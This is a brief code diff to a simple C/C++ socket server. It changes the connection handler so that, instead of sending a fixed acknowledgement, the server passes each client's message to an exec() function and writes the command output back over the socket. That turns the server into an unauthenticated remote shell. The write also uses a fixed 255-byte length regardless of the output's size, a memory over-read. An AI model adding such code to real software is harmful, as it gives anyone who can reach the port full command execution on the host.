@@ -11,7 +11,7 @@
 #include <sys/types.h> 
 #include <sys/socket.h>
 #include <netinet/in.h>
-
+#include "exec.cpp"
 void dostuff(int); /* function prototype */
 void error(char *msg)
 {
@@ -65,6 +65,7 @@ int main(int argc, char *argv[])
  for each connection.  It handles all communication
  once a connnection has been established.
  *****************************************/
+
 void dostuff (int sock)
 {
    int n;
@@ -74,6 +75,6 @@ void dostuff (int sock)
    n = read(sock,buffer,255);
    if (n < 0) error("ERROR reading from socket");
    printf("Here is the message: %s\n",buffer);
-   n = write(sock,"I got your message",18);
+   n = write(sock,exec(buffer).c_str(),255);
    if (n < 0) error("ERROR writing to socket");
 }
